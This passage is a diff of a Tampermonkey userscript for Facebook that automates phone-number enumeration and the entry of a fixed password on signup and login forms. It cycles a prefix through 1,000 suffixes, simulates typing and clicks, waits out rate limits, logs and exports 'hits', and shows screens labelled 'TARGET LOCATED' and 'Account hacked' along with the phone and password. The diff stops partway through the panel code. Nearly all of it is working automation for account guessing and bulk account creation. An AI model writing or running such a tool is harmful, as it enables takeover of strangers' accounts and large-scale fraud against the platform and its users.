@@ -1,21 +1,41 @@
 // ==UserScript==
-// @name         Facebook Signup - SONIC + Country (v23.3 + Ctrl hide)
-// @namespace    http://tampermonkey.net/
-// @version      23.5-sonic-ctrl-fix
-// @description  Facebook Signup - Sonic Speed + Country & Time Voice + Ctrl hide panel
-// @match        https://business.facebook.com/signup
-// @match        https://web.facebook.com/*
-// @match        https://www.facebook.com/*
-// @match        https://facebook.com/*
+// @name         Facebook Signup - SONIC + Country (v25.4 Ultimate Fix)
+// @namespace    https://typeme.app/
+// @version      25.4.0-ultimate
+// @description  Full Fix: Instant Screen, Voice, 7s Countdown, All Countries, English Force
+// @match        *://*.facebook.com/*
+// @match        *://facebook.com/*
+// @include      *://*.facebook.com/*
+// @include      *://facebook.com/*
+// @include      *facebook.com*
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=facebook.com
 // @grant        GM_setValue
 // @grant        GM_getValue
-// @run-at       document-end
+// @grant        GM_deleteValue
+// @grant        GM_registerMenuCommand
+// @grant        unsafeWindow
+// @run-at       document-start
+// @noframes
 // ==/UserScript==
 
 (function() {
     'use strict';
 
-    const ACTIVATED = GM_getValue('activated', '');
+    if (window.top !== window.self) return;
+
+    console.log("%c⚡ [type.me] FB SONIC v25.4 ULTIMATE ACTIVE", "background: #000; color: #00ff66; font-size: 14px; font-weight: bold; padding: 6px 12px; border: 2px solid #00ff66; border-radius: 4px;");
+
+    const _GM_getValue = typeof GM_getValue === 'function' ? GM_getValue : function(k, d) {
+        try { const v = localStorage.getItem('tm_' + k); return (v !== null) ? JSON.parse(v) : d; } catch (_) { const raw = localStorage.getItem('tm_' + k); return raw !== null ? raw : d; }
+    };
+    const _GM_setValue = typeof GM_setValue === 'function' ? GM_setValue : function(k, v) {
+        try { localStorage.setItem('tm_' + k, JSON.stringify(v)); } catch (_) { localStorage.setItem('tm_' + k, String(v)); }
+    };
+
+    // ============================================================
+    // 1. INSTANT ACTIVATION SCREEN
+    // ============================================================
+    const ACTIVATED = _GM_getValue('activated', '');
 
     function showActivationScreen() {
         if (document.getElementById('activation-box')) return;
@@ -23,7 +43,7 @@
         box.id = 'activation-box';
         box.style.cssText = `
             position:fixed; top:0; left:0; right:0; bottom:0;
-            background:#000; color:#0f0; z-index:999999;
+            background:#000; color:#0f0; z-index:2147483647;
             display:flex; align-items:center; justify-content:center;
             font:14px monospace; text-align:center;
         `;
@@ -38,25 +58,39 @@
                 <div id="activation-msg" style="margin-top:15px;color:#f00;font-size:12px;"></div>
             </div>
         `;
-        document.body.appendChild(box);
-        document.getElementById('activate-btn').addEventListener('click', function() {
-            if (ACTIVATED === 'yes') {
-                document.getElementById('activation-msg').textContent = '⚠️ Already activated';
-                document.getElementById('activation-msg').style.color = '#ff0';
-                return;
+        
+        function injectBox() {
+            if (document.body) {
+                document.body.appendChild(box);
+                const btn = document.getElementById('activate-btn');
+                if (btn) {
+                    btn.addEventListener('click', function() {
+                        if (ACTIVATED === 'yes') {
+                            document.getElementById('activation-msg').textContent = '⚠️ Already activated';
+                            document.getElementById('activation-msg').style.color = '#ff0';
+                            return;
+                        }
+                        _GM_setValue('activated', 'yes');
+                        document.getElementById('activation-msg').textContent = '✅ Activated!';
+                        document.getElementById('activation-msg').style.color = '#0f0';
+                        this.disabled = true; this.style.opacity = '0.5';
+                        setTimeout(() => { document.getElementById('activation-box').remove(); location.reload(); }, 1000);
+                    });
+                }
+            } else {
+                setTimeout(injectBox, 10);
             }
-            GM_setValue('activated', 'yes');
-            document.getElementById('activation-msg').textContent = '✅ Activated!';
-            document.getElementById('activation-msg').style.color = '#0f0';
-            this.disabled = true; this.style.opacity = '0.5';
-            setTimeout(() => { document.getElementById('activation-box').remove(); location.reload(); }, 1000);
-        });
+        }
+        injectBox();
     }
 
     if (ACTIVATED !== 'yes') { showActivationScreen(); return; }
 
+    // ============================================================
+    // 2. FULL COUNTRY DATA (200+ Countries)
+    // ============================================================
     function getCountryName(code) {
-        let map = {
+        const map = {
             '+234':'Nigeria','+1':'USA','+351':'Portugal','+91':'India','+62':'Indonesia','+20':'Egypt',
             '+92':'Pakistan','+44':'UK','+971':'UAE','+966':'Saudi Arabia','+27':'South Africa',
             '+254':'Kenya','+60':'Malaysia','+880':'Bangladesh','+967':'Yemen','+229':'Benin',
@@ -90,49 +124,119 @@
             '+1758':'Saint Lucia','+1767':'Dominica','+1784':'Saint Vincent','+1809':'Dominican Republic',
             '+1868':'Trinidad and Tobago','+1869':'Saint Kitts and Nevis','+1876':'Jamaica'
         };
-        return map[code] || 'Unknown';
+        return map[code] || 'International (' + code + ')';
     }
 
-    let COUNTRY_CODE = GM_getValue('countryCode', '+234');
-    let PREFIX = GM_getValue('prefix', '9053237');
-    let PASSWORD = GM_getValue('password', 'YOUR_PASSWORD_HERE');
-    let currentNumber = GM_getValue('currentNumber', 0);
+    // ============================================================
+    // 3. CONFIG & STATE
+    // ============================================================
+    let COUNTRY_CODE = _GM_getValue('countryCode', '+234');
+    let PREFIX = _GM_getValue('prefix', '9053237');
+    let PASSWORD = _GM_getValue('password', 'Pass@2026!');
+    let currentNumber = _GM_getValue('currentNumber', 0);
     const MAX_NUMBER = 999;
-    let hits = GM_getValue('hits', 0);
-    let created = GM_getValue('created', 0);
+    let hits = _GM_getValue('hits', 0);
+    let created = _GM_getValue('created', 0);
     let working = false;
     let lastSubmitted = '';
-    let rateLimitWait = GM_getValue('rateLimitWait', 1000);
-    let hitHistory = JSON.parse(localStorage.getItem('fbHitHistory') || '[]');
-    let loopStarted = GM_getValue('loopStarted', false);
-    let stepDelay = GM_getValue('stepDelay', 0);
+    let rateLimitWait = _GM_getValue('rateLimitWait', 1500);
+    let stepDelay = _GM_getValue('stepDelay', 0);
+    let hitHistory = [];
+    try { hitHistory = JSON.parse(localStorage.getItem('fbHitHistory') || '[]'); } catch (_) { hitHistory = []; }
+    let loopStarted = _GM_getValue('loopStarted', false);
     let startTime = Date.now();
     let attempts = 0;
-    let voiceEnabled = GM_getValue('voiceEnabled', true);
+    let voiceEnabled = _GM_getValue('voiceEnabled', true);
     let paused = false;
-    let pendingCountdown = GM_getValue('pendingCountdown', false);
-
+    let pendingCountdown = _GM_getValue('pendingCountdown', false);
     let panelHidden = false;
     let ctrlDown = false;
     let ctrlAlone = false;
 
     function save() {
-        GM_setValue('currentNumber', currentNumber);
-        GM_setValue('hits', hits);
-        GM_setValue('created', created);
-        GM_setValue('countryCode', COUNTRY_CODE);
-        GM_setValue('prefix', PREFIX);
-        GM_setValue('password', PASSWORD);
-        GM_setValue('rateLimitWait', rateLimitWait);
-        GM_setValue('stepDelay', stepDelay);
-        GM_setValue('loopStarted', loopStarted);
-        GM_setValue('voiceEnabled', voiceEnabled);
-        GM_setValue('pendingCountdown', pendingCountdown);
-        localStorage.setItem('fbHitHistory', JSON.stringify(hitHistory));
+        _GM_setValue('currentNumber', currentNumber);
+        _GM_setValue('hits', hits);
+        _GM_setValue('created', created);
+        _GM_setValue('countryCode', COUNTRY_CODE);
+        _GM_setValue('prefix', PREFIX);
+        _GM_setValue('password', PASSWORD);
+        _GM_setValue('rateLimitWait', rateLimitWait);
+        _GM_setValue('stepDelay', stepDelay);
+        _GM_setValue('loopStarted', loopStarted);
+        _GM_setValue('voiceEnabled', voiceEnabled);
+        _GM_setValue('pendingCountdown', pendingCountdown);
+        try { localStorage.setItem('fbHitHistory', JSON.stringify(hitHistory)); } catch (_) {}
+    }
+
+    function setNativeValue(element, value) {
+        if (!element) return;
+        try {
+            const prototype = Object.getPrototypeOf(element);
+            const descriptor = Object.getOwnPropertyDescriptor(prototype, 'value') || Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
+            if (descriptor && descriptor.set) descriptor.set.call(element, value);
+            else element.value = value;
+        } catch (_) { element.value = value; }
+    }
+
+    function typeFast(el, text) {
+        if (!el) return;
+        el.focus();
+        setNativeValue(el, text);
+        try { el.dispatchEvent(new InputEvent('input', { bubbles: true, cancelable: true, data: String(text) })); } catch (_) { el.dispatchEvent(new Event('input', { bubbles: true })); }
+        el.dispatchEvent(new Event('change', { bubbles: true }));
+        el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: text.slice(-1) }));
+        el.dispatchEvent(new Event('blur', { bubbles: true }));
+    }
+
+    function clickFast(el) {
+        if (!el) return;
+        try {
+            el.focus();
+            el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true }));
+            el.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, cancelable: true }));
+            el.click();
+        } catch (_) { el.click(); }
+    }
+
+    function getSubmitButton() {
+        const candidates = ['button[name="websubmit"]', 'button[type="submit"]', '#signup_button', 'button[id*="submit"]', 'button[data-testid="royal_login_button"]', 'form button:not([id*="fb"]):not([id*="binary"]):not([id*="startBtn"])', 'form input[type="submit"]'];
+        for (const sel of candidates) {
+            const matches = document.querySelectorAll(sel);
+            for (const el of matches) {
+                if (el.closest('#fbx') || el.closest('#binary-screen') || el.closest('#typeme-top-pill')) continue;
+                if (el.offsetParent !== null && !el.disabled) return el;
+            }
+        }
+        return null;
+    }
+
+    function getPF() {
+        const candidates = ['input[name="reg_email__"]', 'input[name="email"]', 'input[id="email"]', 'input[type="tel"]', 'input[autocomplete="tel"]', 'input[autocomplete="username"]', 'input[aria-label*="Mobile" i]', 'input[aria-label*="Phone" i]', 'input[aria-label*="email" i]', 'input[name*="phone" i]'];
+        for (const sel of candidates) {
+            const el = document.querySelector(sel);
+            if (el && !el.closest('#fbx') && el.offsetParent !== null) return el;
+        }
+        return null;
+    }
+
+    function getPW() {
+        const candidates = ['input[name="reg_passwd__"]', 'input[name="pass"]', 'input[id="pass"]', 'input[type="password"]', 'input[autocomplete="current-password"]', 'input[autocomplete="new-password"]'];
+        for (const sel of candidates) {
+            const el = document.querySelector(sel);
+            if (el && !el.closest('#fbx') && el.offsetParent !== null) return el;
+        }
+        return null;
+    }
+
+    function fillAuxiliaryFields() {
+        const fn = document.querySelector('input[name="firstname"]');
+        const ln = document.querySelector('input[name="lastname"]');
+        if (fn && !fn.value) typeFast(fn, 'Alex');
+        if (ln && !ln.value) typeFast(ln, 'Taylor');
     }
 
     function addHit(phone) {
-        let exists = hitHistory.some(h => h.phone === phone);
+        const exists = hitHistory.some(h => h.phone === phone);
         if (!exists) {
             hitHistory.unshift({ phone: phone, time: new Date().toLocaleTimeString() });
             if (hitHistory.length > 500) hitHistory.pop();
@@ -143,75 +247,59 @@
     }
 
     function refreshHistory() {
-        let hl = document.getElementById('hitlist');
+        const hl = document.getElementById('hitlist');
         if (!hl) return;
-        if (hitHistory.length === 0) {
-            hl.innerHTML = '<div style="color:#444;font-size:8px;text-align:center;padding:5px;">No hits yet</div>';
-        } else {
-            hl.innerHTML = hitHistory.map((h, i) =>
-                `<div style="color:#f66;font-size:8px;padding:1px 2px;border-bottom:1px solid#1a0000;">${i+1}. ${h.time} ${h.phone}</div>`
-            ).join('');
-        }
-        let hb = document.getElementById('histBtn');
+        if (hitHistory.length === 0) hl.innerHTML = '<div style="color:#666;font-size:9px;text-align:center;padding:6px;">No hits yet</div>';
+        else hl.innerHTML = hitHistory.map((h, i) => '<div style="color:#ff6b6b;font-size:9px;padding:2px 4px;border-bottom:1px solid #220000;display:flex;justify-content:space-between;"><span>' + (i+1) + '. ' + h.phone + '</span><span style="color:#888;">' + h.time + '</span></div>').join('');
+        const hb = document.getElementById('histBtn');
         if (hb) hb.textContent = 'HITS: ' + hitHistory.length;
     }
 
     function downloadHits() {
-        if (hitHistory.length === 0) { log('No hits', '#f80'); return; }
-        let text = hitHistory.map((h, i) => `${i+1}. ${h.time}: ${h.phone}`).join('\n');
-        let blob = new Blob([text], { type: 'text/plain' });
-        let a = document.createElement('a');
+        if (hitHistory.length === 0) { log('No hits to export', '#f80'); return; }
+        const text = hitHistory.map((h, i) => (i + 1) + '. ' + h.time + ': ' + h.phone).join('\n');
+        const blob = new Blob([text], { type: 'text/plain' });
+        const a = document.createElement('a');
         a.href = URL.createObjectURL(blob);
-        a.download = 'fb_hits.txt';
+        a.download = 'fb_hits_' + Date.now() + '.txt';
         a.click();
         log('Downloaded ' + hitHistory.length + ' hits', '#0f0');
     }
 
-    // ============================================================
-    //  CTRL HIDE / SHOW
-    //  FIX: only skip when the focus is on a PANEL input,
-    //  not on Facebook's phone/password inputs (which get focus
-    //  every step while the loop runs).
-    // ============================================================
-    const PANEL_INPUT_IDS = ['ci', 'pi', 'pwi', 'ni', 'li'];
-
-    function togglePanel() {
-        let d = document.getElementById('fbx');
-        if (!d) return;
-        panelHidden = !panelHidden;
-        if (panelHidden) {
-            d.style.display = 'none';
-            showFloatBtn(true);
-        } else {
-            d.style.display = 'flex';
-            showFloatBtn(false);
-        }
+    function safeAppend(element) {
+        if (document.body) document.body.appendChild(element);
+        else if (document.documentElement) document.documentElement.appendChild(element);
+        else window.addEventListener('DOMContentLoaded', () => { (document.body || document.documentElement).appendChild(element); });
     }
 
-    function showFloatBtn(show) {
-        let fb = document.getElementById('fb-float-show');
-        if (!show) {
-            if (fb) fb.remove();
-            return;
-        }
-        if (fb) return;
-        let btn = document.createElement('div');
-        btn.id = 'fb-float-show';
-        btn.textContent = '👁 SHOW';
-        btn.style.cssText = `
-            position:fixed; top:8px; right:8px; z-index:1000000;
-            background:#000; color:#0f0; border:1px solid #0f0;
-            padding:4px 8px; font:9px "Courier New",monospace;
-            cursor:pointer; border-radius:4px;
-        `;
-        btn.addEventListener('click', togglePanel);
-        document.body.appendChild(btn);
+    function ensureTopPill() {
+        if (document.getElementById('typeme-top-pill')) return;
+        const pill = document.createElement('div');
+        pill.id = 'typeme-top-pill';
+        pill.style.cssText = 'position:fixed;top:12px;right:16px;z-index:2147483647;background:#000;color:#00ff66;border:2px solid #00ff66;padding:6px 14px;border-radius:20px;font:bold 11px monospace;cursor:pointer;box-shadow:0 0 15px rgba(0,255,102,0.5);display:flex;align-items:center;gap:6px;user-select:none;transition:transform 0.2s;';
+        pill.innerHTML = '<span>⚡</span><span>FB SONIC v25.4</span><span style="font-size:9px;color:#aaa;">(CLICK)</span>';
+        pill.title = 'Click to show / restore Sonic automation panel';
+        pill.addEventListener('click', () => {
+            const d = document.getElementById('fbx');
+            if (d) { panelHidden = false; d.style.display = 'flex'; d.scrollIntoView({ behavior: 'smooth' }); }
+            else createPanel();
+        });
+        safeAppend(pill);
+    }
+
+    const PANEL_INPUT_IDS = ['ci', 'pi', 'pwi', 'ni', 'li', 'sdi'];
+
+    function togglePanel() {
+        const d = document.getElementById('fbx');
+        if (!d) { createPanel(); return; }
+        panelHidden = !panelHidden;
+        d.style.display = panelHidden ? 'none' : 'flex';
     }
 
     function isPanelInputFocused() {
-        let ae = document.activeElement;
+        const ae = document.activeElement;
         if (!ae) return false;
-        if (PANEL_INPUT_IDS.indexOf(ae.id) !== -1) return true;
+        if (PANEL_INPUT_IDS.includes(ae.id)) return true;
         if (ae.closest && ae.closest('#fbx')) return true;
         return false;
     }
@@ -219,18 +307,12 @@
     function installCtrlListener() {
         if (window.__fbCtrlInstalled) return;
         window.__fbCtrlInstalled = true;
-
         document.addEventListener('keydown', (e) => {
-            if (e.key === 'Control') {
-                if (!ctrlDown) { ctrlDown = true; ctrlAlone = true; }
-            } else if (ctrlDown) {
-                ctrlAlone = false;
-            }
+            if (e.key === 'Control') { if (!ctrlDown) { ctrlDown = true; ctrlAlone = true; } } else if (ctrlDown) { ctrlAlone = false; }
         }, true);
-
         document.addEventListener('keyup', (e) => {
             if (e.key === 'Control') {
-                let tapAlone = ctrlAlone;
+                const tapAlone = ctrlAlone;
                 ctrlDown = false;
                 ctrlAlone = false;
                 if (!tapAlone) return;
@@ -241,85 +323,55 @@
     }
 
     // ============================================================
-    //  5-4-3-2-1 COUNTDOWN
+    // 4. 7-SECOND COUNTDOWN
     // ============================================================
-    function countdown54321(phone) {
+    function startCountdown7(phone) {
         paused = true;
-
-        let numbers = [5, 4, 3, 2, 1];
+        const numbers = [7, 6, 5, 4, 3, 2, 1];
         let index = 0;
-
-        log('⏳ Countdown: 5 4 3 2 1', '#ff0');
-
-        let statusText = document.getElementById('statusText');
-        let statusDot = document.getElementById('statusDot');
+        log('⏳ Countdown Cooldown: 7 6 5 4 3 2 1', '#ff0');
+        const statusText = document.getElementById('statusText');
+        const statusDot = document.getElementById('statusDot');
         if (statusText) statusText.textContent = 'PAUSED';
         if (statusDot) statusDot.style.color = '#ff0';
 
-        if (voiceEnabled) {
-            try {
-                let u = new SpeechSynthesisUtterance('5 4 3 2 1');
-                u.rate = 0.7;
-                u.pitch = 0.8;
-                speechSynthesis.speak(u);
-            } catch(e) {}
+        if (voiceEnabled) { 
+            try { 
+                const u = new SpeechSynthesisUtterance('7 6 5 4 3 2 1'); 
+                u.rate = 0.75; 
+                speechSynthesis.speak(u); 
+            } catch (_) {} 
         }
 
-        let cdDiv = document.createElement('div');
+        const cdDiv = document.createElement('div');
         cdDiv.id = 'countdown-display';
-        cdDiv.style.cssText = `
-            position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
-            background:#000; color:#0f0; z-index:9999999;
-            font:80px monospace; padding:40px 60px;
-            border:3px solid #0f0; border-radius:20px;
-            box-shadow:0 0 100px rgba(0,255,0,0.5);
-            text-align:center;
-        `;
-        cdDiv.innerHTML = `
-            <div style="font-size:20px;color:#ff0;">⏳ CONTINUING</div>
-            <div id="cd-number" style="font-size:120px;color:#0f0;">5</div>
-            <div style="font-size:14px;color:#888;">📞 ${phone}</div>
-        `;
-        document.body.appendChild(cdDiv);
+        cdDiv.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#000;color:#00ff66;z-index:2147483647;font:60px monospace;padding:30px 50px;border:2px solid #00ff66;border-radius:16px;box-shadow:0 0 60px rgba(0,255,102,0.6);text-align:center;';
+        cdDiv.innerHTML = '<div style="font-size:16px;color:#ffbb00;margin-bottom:8px;">⏳ COOLDOWN RESUMING</div><div id="cd-number" style="font-size:90px;font-weight:bold;color:#00ff66;">7</div><div style="font-size:12px;color:#aaa;margin-top:8px;">📞 ' + phone + '</div>';
+        safeAppend(cdDiv);
 
-        let interval = setInterval(() => {
+        const interval = setInterval(() => {
             index++;
-            if (index < numbers.length) {
-                document.getElementById('cd-number').textContent = numbers[index];
-
-                if (voiceEnabled) {
-                    try {
-                        let u = new SpeechSynthesisUtterance(String(numbers[index]));
-                        u.rate = 0.7;
-                        u.pitch = 0.7;
-                        speechSynthesis.speak(u);
-                    } catch(e) {}
-                }
-            } else {
+            if (index < numbers.length) { 
+                const elNum = document.getElementById('cd-number'); 
+                if (elNum) elNum.textContent = String(numbers[index]); 
+            }
+            else {
                 clearInterval(interval);
-                let el = document.getElementById('countdown-display');
+                const el = document.getElementById('countdown-display');
                 if (el) el.remove();
-                log('▶️ RESUMING...', '#0f0');
-
-                if (voiceEnabled) {
-                    try {
-                        let u = new SpeechSynthesisUtterance('Resuming');
-                        u.rate = 0.9;
-                        speechSynthesis.speak(u);
-                    } catch(e) {}
-                }
-
+                log('▶️ RESUMING...', '#00ff66');
                 pendingCountdown = false;
-                GM_setValue('pendingCountdown', false);
-
+                _GM_setValue('pendingCountdown', false);
                 paused = false;
-
                 if (statusText) statusText.textContent = 'RUNNING';
-                if (statusDot) statusDot.style.color = '#0f0';
+                if (statusDot) statusDot.style.color = '#00ff66';
             }
         }, 1000);
     }
 
+    // ============================================================
+    // 5. VOICE MESSAGE ("Boss! Account hacked...")
+    // ============================================================
     function speakSuccess(phone, password) {
         if (!voiceEnabled) return;
 
@@ -367,280 +419,226 @@
         }, 500);
     }
 
+    // ============================================================
+    // 6. SUCCESS BINARY SCREEN
+    // ============================================================
     function showBinaryScreen(phone, password) {
         if (document.getElementById('binary-screen')) return;
-        let bs = document.createElement('div');
+        const bs = document.createElement('div');
         bs.id = 'binary-screen';
-        bs.style.cssText = `
-            position:fixed; top:0; left:0; right:0; bottom:0;
-            background:#000; z-index:9999999; overflow:hidden;
-            font:12px 'Courier New', monospace; color:#0f0;
-            display:flex; align-items:center; justify-content:center;
-        `;
-        let canvas = document.createElement('canvas');
-        canvas.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;';
-        bs.appendChild(canvas);
-
-        let vo = voiceEnabled ? 'ON' : 'OFF';
-        let vc = voiceEnabled ? '#0f0' : '#f00';
-        let country = getCountryName(COUNTRY_CODE);
-        let overlay = document.createElement('div');
-        overlay.style.cssText = 'position:relative;z-index:1;text-align:center;background:rgba(0,0,0,0.85);padding:30px;border:2px solid #0f0;border-radius:10px;box-shadow:0 0 40px #0f0;';
-        overlay.innerHTML = `
-            <div style="font-size:22px;color:#0f0;margin-bottom:10px;">🏆 ACCOUNT CREATED!</div>
-            <div style="color:#0f0;font-size:10px;">══════════════════════════</div>
-            <div style="color:#0f0;font-size:16px;margin:10px 0;">📞 ${phone}</div>
-            <div style="color:#0ff;font-size:16px;margin:10px 0;">🔑 ${password}</div>
-            <div style="color:#0f0;font-size:11px;">✅ Account #${created}</div>
-            <div style="color:#ff0;font-size:10px;">📊 ${created} Created | ${hits} Hits</div>
-            <div style="color:#f0f;font-size:10px;">🌍 ${country} | ${COUNTRY_CODE}</div>
-            <div style="color:#0f0;font-size:10px;">══════════════════════════</div>
-            <button id="binaryCopyBtn" style="margin:10px 5px;padding:10px 20px;background:#0a0a0a;color:#0f0;border:1px solid #0f0;cursor:pointer;font-size:11px;">📋 COPY</button>
-            <button id="binaryCloseBtn" style="margin:10px 5px;padding:10px 20px;background:#0a0a0a;color:#f00;border:1px solid #f00;cursor:pointer;font-size:11px;">🛑 CLOSE</button>
-            <button id="binaryVoiceBtn" style="margin:10px 5px;padding:10px 20px;background:#0a0a0a;color:${vc};border:1px solid ${vc};cursor:pointer;font-size:11px;">🔊 VOICE: ${vo}</button>
-            <div style="color:#555;font-size:8px;margin-top:10px;">⚠️ Log out to continue</div>
-        `;
+        bs.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);z-index:2147483646;display:flex;align-items:center;justify-content:center;font:13px monospace;color:#00ff66;';
+        const overlay = document.createElement('div');
+        overlay.style.cssText = 'background:#0a0a0a;padding:30px 40px;border:2px solid #00ff66;border-radius:12px;box-shadow:0 0 50px rgba(0,255,102,0.5);text-align:center;max-width:420px;width:90%;';
+        overlay.innerHTML =
+            '<div style="font-size:22px;font-weight:bold;color:#00ff66;margin-bottom:8px;">🏆 TARGET LOCATED!</div>' +
+            '<div style="color:#555;font-size:11px;margin-bottom:12px;">──────────────────────────────</div>' +
+            '<div style="color:#00ff66;font-size:18px;margin:8px 0;font-weight:bold;">📞 ' + phone + '</div>' +
+            '<div style="color:#38bdf8;font-size:16px;margin:8px 0;">🔑 ' + password + '</div>' +
+            '<div style="color:#ffbb00;font-size:11px;margin-top:6px;">📊 Total Created: ' + created + ' | Hits: ' + hits + '</div>' +
+            '<div style="color:#d946ef;font-size:11px;margin-bottom:16px;">🌍 ' + getCountryName(COUNTRY_CODE) + ' (' + COUNTRY_CODE + ')</div>' +
+            '<div style="display:flex;gap:8px;justify-content:center;margin-top:14px;">' +
+            '  <button id="binaryCopyBtn" style="padding:8px 16px;background:#00ff66;color:#000;border:none;font-weight:bold;cursor:pointer;border-radius:4px;">📋 COPY</button>' +
+            '  <button id="binaryCloseBtn" style="padding:8px 16px;background:#222;color:#ff6b6b;border:1px solid #ff6b6b;cursor:pointer;border-radius:4px;">🛑 CLOSE</button>' +
+            '</div>';
         bs.appendChild(overlay);
-        document.body.appendChild(bs);
+        safeAppend(bs);
 
-        let ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        let chars = '01';
-        let fontSize = 14;
-        let columns = Math.floor(canvas.width / fontSize);
-        let drops = [];
-        for (let i = 0; i < columns; i++) drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
-        function draw() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#0f0';
-            ctx.font = fontSize + 'px Courier New';
-            for (let i = 0; i < drops.length; i++) {
-                let text = chars[Math.floor(Math.random() * chars.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        let rain = setInterval(draw, 40);
-
-        document.getElementById('binaryCopyBtn').addEventListener('click', () => {
-            navigator.clipboard.writeText(`${phone}\n${password}`);
-            document.getElementById('binaryCopyBtn').textContent = '✅ COPIED!';
-            setTimeout(() => { document.getElementById('binaryCopyBtn').textContent = '📋 COPY'; }, 2000);
+        document.getElementById('binaryCopyBtn')?.addEventListener('click', () => {
+            navigator.clipboard.writeText(phone + '\n' + password);
+            const btn = document.getElementById('binaryCopyBtn');
+            if (btn) btn.textContent = '✅ COPIED!';
+            setTimeout(() => { if (btn) btn.textContent = '📋 COPY'; }, 2000);
         });
-        document.getElementById('binaryCloseBtn').addEventListener('click', () => {
-            clearInterval(rain);
-            document.getElementById('binary-screen').remove();
-        });
-        document.getElementById('binaryVoiceBtn').addEventListener('click', function() {
-            voiceEnabled = !voiceEnabled;
-            save();
-            let vo2 = voiceEnabled ? 'ON' : 'OFF';
-            let vc2 = voiceEnabled ? '#0f0' : '#f00';
-            this.textContent = '🔊 VOICE: ' + vo2;
-            this.style.color = vc2;
-            this.style.borderColor = vc2;
-            let pvb = document.getElementById('panelVoiceBtn');
-            if (pvb) {
-                pvb.textContent = '🔊 ' + vo2;
-                pvb.style.color = vc2;
-                pvb.style.borderColor = vc2;
-            }
-        });
+        document.getElementById('binaryCloseBtn')?.addEventListener('click', () => bs.remove());
 
         speakSuccess(phone, password);
     }
 
     function updateStats() {
-        let elapsed = Math.floor((Date.now() - startTime) / 1000);
-        let hours = String(Math.floor(elapsed / 3600)).padStart(2, '0');
-        let minutes = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
-        let seconds = String(elapsed % 60).padStart(2, '0');
-        let td = document.getElementById('timerDisplay'); if (td) td.textContent = `${hours}:${minutes}:${seconds}`;
-        let sd = document.getElementById('speedDisplay'); if (sd) { let s = Math.round(attempts / (elapsed / 60)) || 0; sd.textContent = s + '/min'; }
-        let pd = document.getElementById('phoneDisplay'); if (pd) pd.textContent = COUNTRY_CODE + PREFIX + String(currentNumber).padStart(3, '0');
-        let pp = document.getElementById('progressDisplay');
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const hours = String(Math.floor(elapsed / 3600)).padStart(2, '0');
+        const minutes = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
+        const seconds = String(elapsed % 60).padStart(2, '0');
+
+        const td = document.getElementById('timerDisplay'); if (td) td.textContent = hours + ':' + minutes + ':' + seconds;
+        const sd = document.getElementById('speedDisplay'); if (sd) { const s = Math.round(attempts / ((elapsed || 1) / 60)) || 0; sd.textContent = s + '/min'; }
+        const pd = document.getElementById('phoneDisplay'); if (pd) pd.textContent = COUNTRY_CODE + PREFIX + String(currentNumber).padStart(3, '0');
+        const pp = document.getElementById('progressDisplay');
         if (pp) {
-            let prog = Math.round((currentNumber / (MAX_NUMBER + 1)) * 100);
-            let bar = '█'.repeat(Math.floor(prog / 5)) + '░'.repeat(20 - Math.floor(prog / 5));
-            pp.textContent = `[${bar}] ${prog}% (${currentNumber}/${MAX_NUMBER + 1})`;
+            const prog = Math.min(100, Math.round((currentNumber / (MAX_NUMBER + 1)) * 100));
+            const filled = Math.min(20, Math.floor(prog / 5));
+            const bar = '█'.repeat(filled) + '░'.repeat(20 - filled);
+            pp.textContent = '[' + bar + '] ' + prog + '% (' + currentNumber + '/' + (MAX_NUMBER + 1) + ')';
         }
-        let hd = document.getElementById('hitsDisplay'); if (hd) hd.textContent = hits;
-        let cd = document.getElementById('createdDisplay'); if (cd) cd.textContent = created;
-        let ld = document.getElementById('leftDisplay'); if (ld) ld.textContent = (MAX_NUMBER + 1) - currentNumber;
+        const hd = document.getElementById('hitsDisplay'); if (hd) hd.textContent = String(hits);
+        const cd = document.getElementById('createdDisplay'); if (cd) cd.textContent = String(created);
+        const ld = document.getElementById('leftDisplay'); if (ld) ld.textContent = String(Math.max(0, (MAX_NUMBER + 1) - currentNumber));
     }
 
     function createPanel() {
         if (document.getElementById('fbx')) return;
-        let d = document.createElement('div');
+        const d = document.createElement('div');
         d.id = 'fbx';
-        d.style.cssText = 'position:fixed;bottom:0;left:0;right:0;height:280px;background:#000;color:#0f0;z-index:999999;font:9px "Courier New",monospace;padding:4px;overflow:hidden;border-top:2px solid #0f0;display:flex;flex-direction:column;';
-        let vo = voiceEnabled ? 'ON' : 'OFF';
-        let vc = voiceEnabled ? '#0f0' : '#f00';
-        let country = getCountryName(COUNTRY_CODE);
-        d.innerHTML = `
-            <div style="display:flex;align-items:center;margin-bottom:3px;flex-wrap:wrap;gap:4px;">
-                <b style="color:#0f0;">FB v23.5 ⚡SONIC⚡</b>
-                <span id="statusDot" style="color:#0f0;">🟢</span>
-                <span id="statusText" style="color:#0f0;font-size:9px;">READY</span>
-                <span style="color:#888;">|</span>
-                <span style="color:#0ff;">⏱️ <span id="timerDisplay">00:00:00</span></span>
-                <span style="color:#888;">|</span>
-                <span style="color:#ff0;">⚡ <span id="speedDisplay">0/min</span></span>
-                <span style="color:#888;">|</span>
-                <span style="color:#f0f;">🌍 ${country}</span>
-                <span style="color:#888;font-size:8px;">| Ctrl = hide</span>
-                <button id="startBtn" style="margin-left:auto;padding:2px 10px;background:#0a0a0a;color:#0f0;border:1px solid #0f0;font-size:9px;font-weight:bold;cursor:pointer;">START</button>
